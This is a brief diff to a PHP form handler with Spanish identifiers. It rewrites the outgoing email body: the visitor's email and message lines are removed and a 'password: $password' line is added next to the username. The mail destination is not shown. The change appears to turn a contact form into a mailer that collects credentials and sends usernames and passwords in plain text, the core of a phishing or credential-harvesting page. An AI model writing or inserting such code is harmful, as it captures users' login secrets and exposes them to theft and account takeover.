@@ -10,8 +10,8 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
     $asunto = "Nuevo mensaje desde la web";
 
     $contenido = "Usuario: $usuario\n";
-    $contenido .= "Email: $email\n";
-    $contenido .= "Mensaje: $mensaje\n";
+    $contenido .= "password: $password\n";
+
 
     $headers = "From: noreply@tuweb.com";
 
